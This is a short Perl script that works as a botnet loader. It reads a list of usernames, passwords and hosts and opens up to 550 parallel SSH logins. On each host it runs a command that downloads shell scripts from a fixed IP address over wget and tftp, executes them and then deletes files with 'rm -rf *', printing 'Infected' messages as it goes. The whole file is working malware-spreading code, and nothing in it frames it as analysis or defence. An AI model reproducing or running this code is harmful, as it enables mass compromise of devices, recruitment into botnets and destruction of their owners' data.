#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;

$file = shift @ARGV;
open(fh, '<',$file) or die "Can't read file '$file' [$!]\n"; @newarray; while (<fh>){ @array = split(':',$_);
push(@newarray,@array);

}
my $pm = new Parallel::ForkManager(550); for (my $i=0; $i <
scalar(@newarray); $i+=3) {
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://45.63.106.90/ghost1.sh; chmod 777 ghost1.sh; sh ghost1.sh; tftp 45.63.106.90 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 45.63.106.90; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *');
                        sleep 10;
                        $channel->close;
                        print "\e[31;1m[Infecting]\e[32;1m[Bot]\e[36;1m[Infected] LOADED: ".$newarray[$c]."\n";
                } else {
                        print "Connected\n";
                }
        } else {
                print "Infected\n";
        }
	$pm->finish;
}
$pm->wait_all_children;